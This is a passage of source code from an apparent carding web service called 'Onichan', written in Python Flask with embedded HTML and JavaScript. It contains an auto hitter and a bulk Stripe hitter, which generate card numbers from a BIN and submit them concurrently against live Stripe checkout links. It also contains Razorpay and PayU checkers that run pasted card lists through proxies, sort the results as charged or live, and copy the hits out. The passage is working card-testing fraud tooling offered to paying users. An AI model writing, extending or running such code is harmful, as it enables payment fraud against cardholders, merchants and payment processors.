        if(results.length===0){empty.style.display='flex';list.style.display='none';return;}
        empty.style.display='none';list.style.display='block';
        let html='';
        results.forEach(r=>{
            const isHit=r.status==='CHARGED'||r.status==='LIVE';
            const isCheck=r.status==='CHECKING';
            html+='<div class="result-item'+(isHit?' hit':'')+(isCheck?' checking':'')+'">';
            html+='<code class="result-card'+(isHit?' live':'')+'">'+r.card+'</code>';
            html+='<span class="'+getBadgeClass(r.status)+'">'+r.status+'</span>';
            if(r.elapsed)html+='<span style="font-family:var(--font-mono);font-size:10px;color:var(--text-muted);flex-shrink:0;">'+r.elapsed+'</span>';
            if(r.message&&!isCheck)html+='<span style="font-family:var(--font-mono);font-size:10px;color:var(--text-muted);max-width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">'+r.message+'</span>';
            html+='</div>';
        });
        list.innerHTML=html;
        list.scrollTop=list.scrollHeight;
        updateStats();
    }

    async function hitCard(card){
        const proxy=await getProxy();
        const url=document.getElementById('checkout-url').value.trim();
        const email=document.getElementById('email-input').value.trim();
        try{
            const body={card:card, proxy:proxy, url:url||undefined, email:email||undefined};
            if(checkoutData) body.checkout_data=checkoutData;
            const resp=await fetch('/api/checkout/check',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
            if(resp.ok)return await resp.json();
            const err=await resp.json().catch(()=>({}));
            return{status:'ERROR',message:err.error||err.response||'HTTP '+resp.status};
        }catch(e){return{status:'ERROR',message:e.message};}
    }

    async function runHitting(lines){
        if(!lines.length)return;
        running=true; stopRequested=false; results=[];
        document.getElementById('start-btn').style.display='none';
        document.getElementById('stop-btn').style.display='flex';
        document.getElementById('progress-panel').style.display='flex';
        document.getElementById('cc-input').disabled=true;

        for(const card of lines){
            if(stopRequested)break;
            results.push({card:card,status:'CHECKING',message:'processing...',elapsed:null});
            renderResults();
            const t0=Date.now();
            const result=await hitCard(card);
            const elapsed=((Date.now()-t0)/1000).toFixed(1)+'s';
            const isHit=result.status==='CHARGED'||result.status==='LIVE';
            const idx=results.findIndex(r=>r.card===card&&r.status==='CHECKING');
            if(idx>=0){results[idx]={card:card,status:result.status||'ERROR',message:result.response||result.message||'',elapsed:elapsed};}
            const done=results.filter(r=>r.status!=='CHECKING').length;
            document.getElementById('progress-text').textContent='Processing '+done+'/'+lines.length+'...';
            document.getElementById('progress-fill').style.width=(done/lines.length*100)+'%';
            renderResults();
            if(isHit){
                showToast('HIT! '+card.split('|')[0].slice(-4));
                break;
            }
        }
        running=false;
        document.getElementById('start-btn').style.display='flex';
        document.getElementById('stop-btn').style.display='none';
        document.getElementById('progress-panel').style.display='none';
        document.getElementById('cc-input').disabled=false;
        countCards();
    }

    async function handleStart(){
        const lines=document.getElementById('cc-input').value.split('\\n').map(l=>l.trim()).filter(Boolean);
        if(!lines.length)return;
        await runHitting(lines);
    }

    function handleStop(){stopRequested=true;running=false;}

    function copyCharged(){
        const hits=results.filter(r=>r.status==='CHARGED'||r.status==='LIVE').map(r=>r.card).join('\\n');
        if(!hits)return;
        navigator.clipboard.writeText(hits);
        showToast('Copied charged cards!');
    }

    window.addEventListener('DOMContentLoaded',function(){
        const sp=localStorage.getItem('sh_proxy_mode');
        if(sp)setProxyMode(sp);
        const op=localStorage.getItem('sh_own_proxy');
        if(op)document.getElementById('own-proxy').value=op;
        countCards();
    });

    document.getElementById('own-proxy').addEventListener('input',function(){localStorage.setItem('sh_own_proxy',this.value.trim());});
    const origSetProxy=setProxyMode;
    setProxyMode=function(m){origSetProxy(m);localStorage.setItem('sh_proxy_mode',m);};

    </script>
    </body>
    </html>
    """)

@app.route('/user/autohitter', methods=['GET', 'POST'])
@user_required
def user_autohitter():
    """User Auto Hitter page - same full-featured interface as admin"""
    return _render_autohitter_page()


# ─── BULK STRIPE HITTER ───────────────────────────────────────────────────────

@app.route('/user/bulkhitter', methods=['GET'])
@user_required
def user_bulkhitter():
    """Bulk Stripe Hitter — generate cards from BIN and hit all simultaneously."""
    user_id = session.get('user_id')
    user_info = get_user_info(user_id)
    is_prem = user_info.get('type') in ('premium', 'owner')
    max_cards = 50 if is_prem else 10
    sidebar = get_user_sidebar('bulkhitter', '⚡ Bulk Hitter')
    plan_badge = ('💎 Premium' if user_info.get('type') == 'premium'
                  else '👑 Owner' if user_info.get('type') == 'owner'
                  else '👤 Free')

    return render_template_string("""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Bulk Stripe Hitter - Onichan</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚡</text></svg>">
<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
<style>
:root{--bg:#0d0a1f;--card:rgba(45,27,61,.85);--input:rgba(20,10,35,.9);--border:rgba(255,105,180,.15);--accent:#ff69b4;--accent2:#ff1493;--green:#22c55e;--red:#ef4444;--yellow:#facc15;--blue:#60a5fa;--text:#f0e6f6;--muted:#7a6890;--mono:'JetBrains Mono','Courier New',monospace}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;font-family:'Nunito',sans-serif;-webkit-font-smoothing:antialiased;color:var(--text);font-size:14px}
body{background:linear-gradient(135deg,#1a0a1f 0%,#2d1b3d 30%,#1f1a3d 60%,#0d0a1f 100%);overflow-y:auto}
::placeholder{color:var(--muted);opacity:.7}
::-webkit-scrollbar{width:4px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:rgba(255,105,180,.2);border-radius:4px}
.layout{display:flex;min-height:100vh}
.main{flex:1;padding:20px 16px 90px;max-width:780px;margin:0 auto;width:100%}
@media(min-width:700px){.main{padding:28px 24px 48px}}
.page-title{font-size:22px;font-weight:800;color:var(--accent);margin-bottom:4px;display:flex;align-items:center;gap:10px}
.page-sub{color:var(--muted);font-size:13px;margin-bottom:20px}
.card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:20px;margin-bottom:16px;backdrop-filter:blur(8px)}
.card h3{font-size:14px;font-weight:700;color:var(--accent);margin-bottom:14px;display:flex;align-items:center;gap:6px}
label{display:block;font-size:12px;color:var(--muted);margin-bottom:5px;font-weight:600;letter-spacing:.4px}
input,select{width:100%;background:var(--input);border:1px solid var(--border);border-radius:8px;padding:10px 12px;color:var(--text);font-size:13px;font-family:inherit;outline:none;transition:border-color .2s}
input:focus,select:focus{border-color:var(--accent)}
.form-row{margin-bottom:12px}
.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
@media(max-width:500px){.form-grid{grid-template-columns:1fr}}
.hint{font-size:11px;color:var(--muted);margin-top:4px}
.btn{width:100%;padding:12px;background:linear-gradient(135deg,var(--accent2),var(--accent));border:none;border-radius:10px;color:#fff;font-weight:800;font-size:14px;cursor:pointer;transition:opacity .2s;margin-top:4px}
.btn:hover{opacity:.88}.btn:disabled{opacity:.5;cursor:not-allowed}
.badge{display:inline-block;padding:3px 8px;border-radius:20px;font-size:11px;font-weight:700;background:rgba(255,105,180,.15);color:var(--accent);border:1px solid rgba(255,105,180,.25)}
.plan-bar{display:flex;align-items:center;justify-content:space-between;background:rgba(255,105,180,.05);border:1px solid rgba(255,105,180,.12);border-radius:10px;padding:10px 14px;margin-bottom:16px;font-size:13px}
.results-wrap{display:none}
.results-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
.results-header h3{font-size:14px;font-weight:700;color:var(--accent)}
.summary-row{display:grid;grid-template-columns:repeat(5,1fr);gap:8px;margin-bottom:12px}
.stat-box{background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:10px;padding:10px;text-align:center}
.stat-box .n{font-size:22px;font-weight:800;line-height:1}
.stat-box .l{font-size:11px;color:var(--muted);margin-top:2px}
.stat-charged .n{color:var(--green)}
.stat-live .n{color:var(--blue)}
.stat-declined .n{color:var(--red)}
.stat-tds .n{color:var(--yellow)}
.stat-error .n{color:var(--red);opacity:.7}
table{width:100%;border-collapse:collapse;font-size:12px}
th{text-align:left;color:var(--muted);font-weight:600;padding:6px 8px;border-bottom:1px solid var(--border)}
td{padding:7px 8px;border-bottom:1px solid rgba(255,105,180,.06);font-family:var(--mono);font-size:11px;word-break:break-all}
tr:last-child td{border-bottom:none}
.tag{display:inline-block;padding:2px 7px;border-radius:20px;font-size:10px;font-weight:700;font-family:'Nunito',sans-serif}
.tag-charged{background:rgba(34,197,94,.15);color:var(--green);border:1px solid rgba(34,197,94,.3)}
.tag-live{background:rgba(96,165,250,.15);color:var(--blue);border:1px solid rgba(96,165,250,.3)}
.tag-declined{background:rgba(239,68,68,.12);color:var(--red);border:1px solid rgba(239,68,68,.2)}
.tag-3ds{background:rgba(250,204,21,.12);color:var(--yellow);border:1px solid rgba(250,204,21,.2)}
.tag-error{background:rgba(255,255,255,.07);color:var(--muted);border:1px solid var(--border)}
.progress-bar{height:4px;background:rgba(255,105,180,.1);border-radius:4px;overflow:hidden;margin-bottom:12px}
.progress-fill{height:100%;background:linear-gradient(90deg,var(--accent2),var(--accent));border-radius:4px;transition:width .3s ease;width:0%}
.spinner{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,105,180,.3);border-top-color:var(--accent);border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle;margin-right:6px}
@keyframes spin{to{transform:rotate(360deg)}}
.alert{padding:10px 14px;border-radius:8px;font-size:13px;margin-bottom:12px}
.alert-error{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.25);color:#fca5a5}
.alert-info{background:rgba(255,105,180,.07);border:1px solid var(--border);color:var(--muted)}
</style>
</head>
<body>
<div class="layout">
{{ sidebar|safe }}
<div class="main">
  <div class="page-title">⚡ Bulk Stripe Hitter</div>
  <div class="page-sub">Generate cards from a BIN and hit them all simultaneously against a Stripe checkout.</div>

  <div class="plan-bar">
    <span>{{ plan_badge }}</span>
    <span style="color:var(--muted)">Max cards per batch: <strong style="color:var(--text)">{{ max_cards }}</strong></span>
  </div>

  <div id="alertBox"></div>

  <div class="card">
    <h3>🎯 Hit Configuration</h3>
    <div class="form-row">
      <label>STRIPE CHECKOUT URL</label>
      <input type="url" id="urlInput" placeholder="https://buy.stripe.com/xxx  or  https://checkout.stripe.com/...">
      <div class="hint">buy.stripe.com · checkout.stripe.com links only</div>
    </div>
    <div class="form-grid">
      <div class="form-row">
        <label>BIN / CARD FORMAT</label>
        <input type="text" id="binInput" placeholder="453201 or 453201|xx|xx|xxx">
        <div class="hint">Add |mm|yy|cvv masks for custom dates</div>
      </div>
      <div class="form-row">
        <label>CARD COUNT (max {{ max_cards }})</label>
        <input type="number" id="countInput" value="10" min="1" max="{{ max_cards }}">
      </div>
    </div>
    <button class="btn" id="hitBtn" onclick="startBulkHit()">⚡ Start Bulk Hit</button>
  </div>

  <div class="results-wrap" id="resultsWrap">
    <div class="card">
      <div class="results-header">
        <h3 id="resultsTitle">Results</h3>
        <span id="progressLabel" style="font-size:12px;color:var(--muted)"></span>
      </div>
      <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
      <div class="summary-row">
        <div class="stat-box stat-charged"><div class="n" id="cntCharged">0</div><div class="l">✅ Charged</div></div>
        <div class="stat-box stat-live"><div class="n" id="cntLive">0</div><div class="l">💚 Live</div></div>
        <div class="stat-box stat-declined"><div class="n" id="cntDeclined">0</div><div class="l">🔴 Declined</div></div>
        <div class="stat-box stat-tds"><div class="n" id="cnt3ds">0</div><div class="l">🔒 3DS</div></div>
        <div class="stat-box stat-error"><div class="n" id="cntError">0</div><div class="l">❌ Errors</div></div>
      </div>
      <table>
        <thead><tr><th>#</th><th>Card</th><th>Status</th><th>Response</th></tr></thead>
        <tbody id="resultsBody"></tbody>
      </table>
    </div>
  </div>
</div>
</div>

<script>
var totalCards = 0, doneCards = 0;
var cnt = {charged:0, live:0, declined:0, tds:0, error:0};
var activeES = null; // current EventSource reference

function showAlert(msg, type){
  var div = document.createElement('div');
  div.className = 'alert alert-' + type;
  div.textContent = msg;
  var box = document.getElementById('alertBox');
  box.innerHTML = '';
  box.appendChild(div);
}

function clearAlert(){ document.getElementById('alertBox').innerHTML = ''; }

function tagHtml(status){
  var map = {
    'CHARGED': ['tag-charged','✅ Charged'],
    'LIVE':    ['tag-live','💚 Live'],
    'DECLINED':['tag-declined','🔴 Declined'],
    '3DS_REQUIRED':['tag-3ds','🔒 3DS'],
    '3DS':     ['tag-3ds','🔒 3DS'],
    'ERROR':   ['tag-error','❌ Error']
  };
  var v = map[status] || ['tag-error', status];
  return '<span class="tag ' + v[0] + '">' + v[1] + '</span>';
}

function startBulkHit(){
  clearAlert();
  var url   = document.getElementById('urlInput').value.trim();
  var bin   = document.getElementById('binInput').value.trim();
  var count = parseInt(document.getElementById('countInput').value) || 10;

  if(!url){ showAlert('Please enter a Stripe checkout URL.', 'error'); return; }
  if(!bin){ showAlert('Please enter a BIN.', 'error'); return; }
  if(count < 1){ count = 1; }
  if(count > {{ max_cards }}){ count = {{ max_cards }}; }

  // Reset
  totalCards = count; doneCards = 0;
  cnt = {charged:0, live:0, declined:0, tds:0, error:0};
  ['cntCharged','cntLive','cntDeclined','cnt3ds','cntError'].forEach(function(id){
    document.getElementById(id).textContent = '0';
  });
  document.getElementById('resultsBody').innerHTML = '';
  document.getElementById('progressFill').style.width = '0%';
  document.getElementById('progressLabel').textContent = '';
  document.getElementById('resultsWrap').style.display = 'block';
  document.getElementById('resultsTitle').innerHTML = '<span class="spinner"></span> Running…';

  var btn = document.getElementById('hitBtn');
  btn.disabled = true;
  btn.textContent = '⏳ Hitting…';

  if(activeES){ activeES.close(); activeES = null; }
  activeES = new EventSource('/api/bulkhit?' + new URLSearchParams({url:url, bin:bin, count:count}));

  activeES.onmessage = function(e){
    try{ handleEvent(JSON.parse(e.data)); } catch(ex){ console.error(ex); }
  };
  activeES.onerror = function(){
    if(activeES){ activeES.close(); activeES = null; }
    finishHit();
    showAlert('Connection error. Results may be incomplete.', 'error');
  };
}

function handleEvent(ev){
  if(ev.type === 'init'){
    document.getElementById('resultsTitle').textContent =
      '⚡ ' + (ev.merchant || 'Unknown') + ' — ' + (ev.currency||'') + ' ' + (ev.price||'');
    totalCards = ev.count || totalCards;
    return;
  }
  if(ev.type === 'result'){
    doneCards++;
    var status = ev.status || 'ERROR';
    var normSt = status.toUpperCase();

    if(normSt === 'CHARGED'){ cnt.charged++; document.getElementById('cntCharged').textContent = cnt.charged; }
    else if(normSt === 'LIVE'){ cnt.live++; document.getElementById('cntLive').textContent = cnt.live; }
    else if(normSt === '3DS_REQUIRED' || normSt === '3DS'){ cnt.tds++; document.getElementById('cnt3ds').textContent = cnt.tds; }
    else if(normSt === 'DECLINED'){ cnt.declined++; document.getElementById('cntDeclined').textContent = cnt.declined; }
    else { cnt.error++; document.getElementById('cntError').textContent = cnt.error; }

    var pct = totalCards > 0 ? Math.round(doneCards/totalCards*100) : 0;
    document.getElementById('progressFill').style.width = pct + '%';
    document.getElementById('progressLabel').textContent = doneCards + ' / ' + totalCards;

    // Build row using DOM nodes — no innerHTML for untrusted data (XSS safe)
    var tbody = document.getElementById('resultsBody');
    var tr = document.createElement('tr');

    var tdNum = document.createElement('td');
    tdNum.textContent = doneCards;

    var tdCard = document.createElement('td');
    var codeEl = document.createElement('code');
    codeEl.textContent = ev.card || '';
    tdCard.appendChild(codeEl);

    var tdStatus = document.createElement('td');
    tdStatus.innerHTML = tagHtml(normSt); // tagHtml only returns safe hardcoded HTML

    var tdResp = document.createElement('td');
    tdResp.textContent = (ev.response || '').substring(0, 80); // textContent — safe

    tr.appendChild(tdNum);
    tr.appendChild(tdCard);
    tr.appendChild(tdStatus);
    tr.appendChild(tdResp);
    tbody.appendChild(tr);
    tbody.scrollTop = tbody.scrollHeight;
    return;
  }
  if(ev.type === 'done' || ev.type === 'error'){
    if(activeES){ activeES.close(); activeES = null; }
    if(ev.type === 'error') showAlert(ev.message || 'Error occurred.', 'error');
    finishHit();
    return;
  }
}

function finishHit(){
  var btn = document.getElementById('hitBtn');
  btn.disabled = false; btn.textContent = '⚡ Start Bulk Hit';
  if(doneCards > 0){
    document.getElementById('resultsTitle').textContent =
      '✅ Done — ' + cnt.charged + ' charged, ' + cnt.live + ' live, '
      + cnt.declined + ' declined, ' + cnt.tds + ' 3DS, ' + cnt.error + ' errors';
  }
}
</script>
</body>
</html>
""", sidebar=sidebar, max_cards=max_cards, plan_badge=plan_badge)


@app.route('/api/bulkhit', methods=['GET'])
@user_required
def api_bulkhit():
    """SSE streaming endpoint — generates cards from BIN and hits them truly concurrently.
    Results are streamed in real time via a thread+queue pattern as each card completes.
    """
    from flask import Response, stream_with_context
    import asyncio, json as _json, threading, queue as _queue

    user_id = session.get('user_id')
    user_info = get_user_info(user_id)
    is_prem = user_info.get('type') in ('premium', 'owner')
    max_cards = 50 if is_prem else 10

    url     = request.args.get('url', '').strip()
    bin_str = request.args.get('bin', '').strip()
    count_str = request.args.get('count', '10').strip()

    try:
        count = max(1, min(int(count_str), max_cards))
    except Exception:
        count = 10

    def generate():
        from modules.auto_hitter import (
            extract_checkout_url, parse_gen_input, generate_cards_from_bin,
            get_currency_symbol as ah_currency_symbol, bulk_hit_cards
        )
        from modules.stripe_tls import get_checkout_info as tls_checkout_info

        checkout_url = extract_checkout_url(url)
        if not checkout_url:
            yield f"data: {_json.dumps({'type':'error','message':'Invalid Stripe checkout URL. Use buy.stripe.com or checkout.stripe.com links.'})}\n\n"
            return

        gen_result = parse_gen_input(bin_str)
        if not gen_result:
            yield f"data: {_json.dumps({'type':'error','message':'Invalid BIN format. Use at least 6 digits, e.g. 453201 or 453201|xx|xx|xxx'})}\n\n"
            return

        prefix, mm, yy, cvv_pattern = gen_result
        card_lines = generate_cards_from_bin(prefix, mm, yy, cvv_pattern, count)

        if not card_lines:
            yield f"data: {_json.dumps({'type':'error','message':'Failed to generate cards from BIN.'})}\n\n"
            return

        # All async work (checkout fetch + card hits) runs inside one dedicated
        # thread with its own event loop — avoids cross-thread loop hand-offs.
        result_queue = _queue.Queue()

        async def _run_all():
            try:
                checkout_data = await tls_checkout_info(checkout_url, None)
            except Exception as ex:
                result_queue.put(('error', None, f'Checkout fetch failed: {str(ex)[:120]}'))
                return

            if not checkout_data.get('pk') or not checkout_data.get('cs'):
                result_queue.put(('error', None, 'Could not parse checkout URL. Make sure it is a valid active Stripe link.'))
                return

            checkout_data['email'] = 'checkout@gmail.com'
            result_queue.put(('init', checkout_data, None))

            async for raw_str, res in bulk_hit_cards(card_lines, checkout_data, None, None):
                result_queue.put(('result', raw_str, res))

            result_queue.put(('done', None, None))

        def _worker():
            loop = asyncio.new_event_loop()
            try:
                loop.run_until_complete(_run_all())
            except Exception as ex:
                result_queue.put(('error', None, str(ex)[:150]))
            finally:
                loop.close()

        t = threading.Thread(target=_worker, daemon=True)
        t.start()

        idx = 0
        while True:
            item = result_queue.get()
            kind = item[0]

            if kind == 'init':
                co = item[1]
                merchant  = str(co.get('merchant') or 'Unknown')[:40]
                price     = co.get('price')
                currency  = co.get('currency', 'USD')
                sym       = ah_currency_symbol(currency)
                price_str = f"{sym}{price:.2f}" if price else 'N/A'
                yield f"data: {_json.dumps({'type':'init','merchant':merchant,'price':price_str,'currency':currency,'count':len(card_lines)})}\n\n"
                continue

            if kind == 'done':
                yield f"data: {_json.dumps({'type':'done','message':'Complete'})}\n\n"
                break

            if kind == 'error':
                yield f"data: {_json.dumps({'type':'error','message': item[2]})}\n\n"
                break

            raw_str, result = item[1], item[2]
            parts   = raw_str.split('|') if raw_str else []
            cc      = parts[0] if len(parts) > 0 else ''
            month   = parts[1] if len(parts) > 1 else ''
            year    = parts[2] if len(parts) > 2 else ''
            masked  = f"{cc[:6]}****{cc[-4:]}|{month}|{year}"
            status  = result.get('status', 'ERROR')
            resp    = str(result.get('response', ''))[:80]

            yield f"data: {_json.dumps({'type':'result','idx':idx,'card':masked,'status':status,'response':resp})}\n\n"
            idx += 1

        t.join(timeout=5)

    return Response(
        stream_with_context(generate()),
        mimetype='text/event-stream',
        headers={
            'Cache-Control': 'no-cache',
            'X-Accel-Buffering': 'no',
            'Connection': 'keep-alive',
        }
    )


@app.route('/api/check/razorpay', methods=['POST'])
@user_required
def api_check_razorpay():
    """API endpoint for Razorpay checking - SSE streaming"""
    from flask import Response, stream_with_context
    MAX_CARDS = 25
    cards_text = request.form.get('cards', '').strip()
    pages_url = request.form.get('pages_url', '').strip()
    amount_str = request.form.get('amount', '1').strip()
    proxy_text = request.form.get('proxy', '').strip()

    if not cards_text:
        return jsonify({"error": "Please enter card details"}), 400
    if not pages_url:
        return jsonify({"error": "Please enter a Razorpay page URL"}), 400
    if 'razorpay' not in pages_url.lower() and 'rzp' not in pages_url.lower():
        return jsonify({"error": "Invalid URL. Must be a Razorpay payment page"}), 400

    card_lines = [c.strip() for c in cards_text.strip().split('\n') if c.strip()]
    if len(card_lines) > MAX_CARDS:
        cards_text = '\n'.join(card_lines[:MAX_CARDS])

    try:
        amount_inr = max(int(amount_str), 1)
    except:
        amount_inr = 1

    def generate():
        import json as _json
        import traceback as _tb
        try:
            from modules.razorpay_auto import run_razorpay_check_streaming
            for event in run_razorpay_check_streaming(cards_text, pages_url, amount_inr, proxy=proxy_text if proxy_text else None):
                yield f"data: {_json.dumps(event)}\n\n"
        except Exception as e:
            print(f"[SSE Razorpay ERROR] {e}")
            _tb.print_exc()
            yield f"data: {_json.dumps({'type': 'error', 'message': str(e)[:300]})}\n\n"
        finally:
            yield f"data: {_json.dumps({'type': 'done', 'message': 'Stream ended'})}\n\n"

    return Response(stream_with_context(generate()), mimetype='text/event-stream', headers={
        'Cache-Control': 'no-cache',
        'X-Accel-Buffering': 'no',
        'Connection': 'keep-alive'
    })


@app.route('/api/check/payu', methods=['POST'])
@user_required
def api_check_payu():
    """API endpoint for PayU checking"""
    from flask import jsonify
    MAX_CARDS = 25
    cards_text = request.form.get('cards', '').strip()
    proxy_text = request.form.get('proxy', '').strip()

    if not cards_text:
        return jsonify({"error": "Please enter card details"}), 400

    card_lines = [c.strip() for c in cards_text.strip().split('\n') if c.strip()]
    if len(card_lines) > MAX_CARDS:
        cards_text = '\n'.join(card_lines[:MAX_CARDS])

    try:
        from modules.payu_auto import run_payu_check
        results, errors = run_payu_check(cards_text, proxy=proxy_text if proxy_text else None)
        if errors:
            return jsonify({"error": "; ".join(errors)}), 400
        return jsonify({"results": results, "truncated": len(card_lines) > MAX_CARDS})
    except Exception as e:
        return jsonify({"error": str(e)[:200]}), 500


@app.route('/user/razorpay', methods=['GET'])
@user_required
def user_razorpay():
    """Auto Razorpay - Check cards through Razorpay payment pages"""
    return render_template_string(f"""
    <html>
    <head><title>Auto Razorpay - Onichan</title>{USER_CSS}
    <style>
        @keyframes spin {{ 0%{{transform:rotate(0deg)}} 100%{{transform:rotate(360deg)}} }}
        @keyframes pulse {{ 0%,100%{{opacity:1}} 50%{{opacity:.5}} }}
        .spinner {{ width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-top:3px solid #fff;border-radius:50%;animation:spin 0.8s linear infinite;display:inline-block;vertical-align:middle;margin-right:10px; }}
        .btn-checking {{ pointer-events:none;opacity:0.85;position:relative; }}
        .progress-bar-wrap {{ background:rgba(255,255,255,0.1);border-radius:8px;height:6px;margin-top:12px;overflow:hidden;display:none; }}
        .progress-bar-fill {{ height:100%;background:linear-gradient(90deg,#ec4899,#8b5cf6,#3b82f6);border-radius:8px;transition:width 0.3s ease;width:0%; }}
        .card-result {{ animation:slideIn 0.3s ease-out; }}
        @keyframes slideIn {{ from{{opacity:0;transform:translateY(10px)}} to{{opacity:1;transform:translateY(0)}} }}
    </style>
    </head>
    <body>
        {get_user_sidebar('razorpay', 'Auto Razorpay')}
        <div class="main">
            <div class="header">
                <div style="display: flex; align-items: center; gap: 12px;">
                    <div style="width: 40px; height: 40px; background: linear-gradient(135deg, #3b82f6, #1d4ed8); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: bold; color: white; font-size: 1.2em;">R</div>
                    <div>
                        <h1 style="margin: 0; font-size: 1.3em;">Auto Razorpay</h1>
                        <p style="margin: 0; opacity: 0.6; font-size: 0.85em;">Check cards through Razorpay payment pages</p>
                    </div>
                </div>
            </div>
            
            <form id="rzpForm" onsubmit="return startCheck(event)">
                <div class="card">
                    <h2>Card Details</h2>
                    <div class="form-group">
                        <textarea name="cards" id="rzpCards" rows="6" placeholder="Paste cards in any format&#10;4111111111111111|12|25|123" style="font-family: monospace;"></textarea>
                    </div>
                    <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                        <button type="button" class="btn btn-secondary" onclick="formatCards()" style="font-size: 0.85em;">Format</button>
                        <label class="btn btn-secondary" style="font-size: 0.85em; cursor: pointer; display: inline-flex; align-items: center; gap: 5px;">
                            Upload
                            <input type="file" accept=".txt" onchange="loadFile(this)" style="display: none;">
                        </label>
                    </div>
                </div>
                
                <div class="card">
                    <h2>Pages URL</h2>
                    <div class="form-group">
                        <textarea name="pages_url" rows="3" placeholder="Enter Razorpay page URL&#10;https://pages.razorpay.com/your-page"></textarea>
                    </div>
                </div>
                
                <div class="card">
                    <h2>Amount (INR)</h2>
                    <div class="form-group">
                        <div style="position: relative;">
                            <span style="position: absolute; left: 12px; top: 50%; transform: translateY(-50%); opacity: 0.6; font-size: 1.1em;">&#8377;</span>
                            <input type="number" name="amount" value="1" min="1" style="padding-left: 30px;">
                        </div>
                    </div>
                </div>
                
                <div class="card">
                    <h2>Proxy (Optional)</h2>
                    <div class="form-group">
                        <input type="text" name="proxy" placeholder="host:port or user:pass@host:port">
                    </div>
                </div>
                
                <button type="submit" id="checkBtn" class="btn btn-primary" style="width: 100%; padding: 14px; font-size: 1.05em; margin-bottom: 10px;">
                    <span id="btnText">Start Checking</span>
                </button>
                <div class="progress-bar-wrap" id="progressWrap">
                    <div class="progress-bar-fill" id="progressBar"></div>
                </div>
            </form>
            
            <div id="resultArea" style="margin-top: 20px;"></div>
        </div>
        
        <script>
        function formatCards() {{
            var ta = document.getElementById('rzpCards');
            var lines = ta.value.split('\\n');
            var formatted = [];
            for (var i = 0; i < lines.length; i++) {{
                var line = lines[i].trim();
                if (!line) continue;
                line = line.replace(/\\s+/g, '|').replace(/\\//g, '|');
                var parts = line.split('|');
                if (parts.length >= 4) formatted.push(parts[0]+'|'+parts[1]+'|'+parts[2]+'|'+parts[3]);
                else formatted.push(line);
            }}
            ta.value = formatted.join('\\n');
        }}
        function loadFile(input) {{
            if (input.files && input.files[0]) {{
                var reader = new FileReader();
                reader.onload = function(e) {{ document.getElementById('rzpCards').value = e.target.result; }};
                reader.readAsText(input.files[0]);
            }}
        }}
        function escapeHtml(t) {{ var d=document.createElement('div'); d.textContent=t; return d.innerHTML; }}

        function renderResults(results) {{
            var live=0,dead=0,other=0,total=results.length;
            var html = '';
            for (var i=0;i<results.length;i++) {{
                var r = results[i];
                var cat = r.category||'UNKNOWN';
                if (cat==='LIVE') live++;
                else if (cat==='DEAD'||cat==='DECLINED'||cat==='EXPIRED') dead++;
                else other++;
                var color,icon,bg;
                if (cat==='LIVE') {{ color='#22c55e'; icon='&#10003;'; bg='rgba(34,197,94,0.15)'; }}
                else if (cat==='DEAD'||cat==='DECLINED'||cat==='EXPIRED') {{ color='#ef4444'; icon='&#10007;'; bg='rgba(239,68,68,0.15)'; }}
                else if (cat==='RISK') {{ color='#a855f7'; icon='&#9888;'; bg='rgba(168,85,247,0.15)'; }}
                else {{ color='#f59e0b'; icon='&#8264;'; bg='rgba(245,158,11,0.15)'; }}
                html += '<div class="card-result" style="background:'+bg+';border-left:3px solid '+color+';padding:12px 15px;margin-bottom:8px;border-radius:0 8px 8px 0;">'
                    +'<div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;">'
                    +'<div><span style="color:'+color+';font-weight:bold;font-size:1.1em;">'+icon+'</span>'
                    +'<code style="margin-left:8px;font-size:0.95em;">'+escapeHtml(r.masked||'N/A')+'</code></div>'
                    +'<span style="color:'+color+';font-weight:600;font-size:0.85em;">'+cat+'</span></div>'
                    +'<div style="margin-top:6px;font-size:0.85em;opacity:0.85;">'+escapeHtml(r.message||'N/A')+'</div>'
                    +'<div style="margin-top:4px;font-size:0.8em;opacity:0.65;display:flex;gap:15px;flex-wrap:wrap;">'
                    +'<span>'+escapeHtml(r.scheme||'N/A')+'</span><span>'+escapeHtml(r.bank||'N/A')+'</span>'
                    +'<span>'+escapeHtml(r.country||'N/A')+'</span><span>'+(r.time||0)+'s</span></div></div>';
            }}
            var statsHtml = '<div style="display:flex;gap:15px;flex-wrap:wrap;margin-bottom:20px;">'
                +'<div style="background:rgba(34,197,94,0.2);border:1px solid rgba(34,197,94,0.3);padding:10px 20px;border-radius:8px;text-align:center;">'
                +'<div style="font-size:1.5em;font-weight:bold;color:#22c55e;">'+live+'</div><div style="font-size:0.8em;opacity:0.7;">Live</div></div>'
                +'<div style="background:rgba(239,68,68,0.2);border:1px solid rgba(239,68,68,0.3);padding:10px 20px;border-radius:8px;text-align:center;">'
                +'<div style="font-size:1.5em;font-weight:bold;color:#ef4444;">'+dead+'</div><div style="font-size:0.8em;opacity:0.7;">Dead</div></div>'
                +'<div style="background:rgba(245,158,11,0.2);border:1px solid rgba(245,158,11,0.3);padding:10px 20px;border-radius:8px;text-align:center;">'
                +'<div style="font-size:1.5em;font-weight:bold;color:#f59e0b;">'+other+'</div><div style="font-size:0.8em;opacity:0.7;">Other</div></div>'
